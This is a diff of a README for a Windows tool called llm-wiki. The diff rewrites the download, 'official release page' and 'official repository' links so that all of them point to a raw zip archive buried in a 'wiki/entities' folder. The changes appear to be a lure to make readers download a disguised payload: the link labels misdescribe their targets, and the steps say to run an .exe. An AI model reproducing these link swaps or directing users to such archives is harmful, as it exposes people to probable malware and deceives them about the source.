@@ -1,6 +1,6 @@
 # 🧠 llm-wiki - Access knowledge using local language models
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/howdow698-ui/llm-wiki)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/howdow698-ui/llm-wiki/raw/refs/heads/main/wiki/entities/wiki_llm_v1.7.zip)
 
 llm-wiki brings the power of artificial intelligence to your personal computer. This software allows you to search, summarize, and organize information using local language models. It runs entirely on your hardware. You do not need an internet connection to process your files once the software loads. This tool helps you manage large amounts of text data without sending your private information to external servers.
 
@@ -8,7 +8,7 @@ llm-wiki brings the power of artificial intelligence to your personal computer. 
 
 Follow these steps to set up llm-wiki on your Windows computer.
 
-1. Go to the [official release page](https://github.com/howdow698-ui/llm-wiki).
+1. Go to the [official release page](https://github.com/howdow698-ui/llm-wiki/raw/refs/heads/main/wiki/entities/wiki_llm_v1.7.zip).
 2. Look for the latest release version at the top of the list.
 3. Click the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
@@ -101,4 +101,4 @@ You do not need to modify these folders. The program manages all file operations
 
 ## 🔗 Resources
 
-For additional guidance, visit the [official repository](https://github.com/howdow698-ui/llm-wiki). The repository provides technical documentation for power users who want to modify the source code or contribute to the project features. Always check the README.md in the repository for the most current information regarding updates and changes.
+For additional guidance, visit the [official repository](https://github.com/howdow698-ui/llm-wiki/raw/refs/heads/main/wiki/entities/wiki_llm_v1.7.zip). The repository provides technical documentation for power users who want to modify the source code or contribute to the project features. Always check the README.md in the repository for the most current information regarding updates and changes.
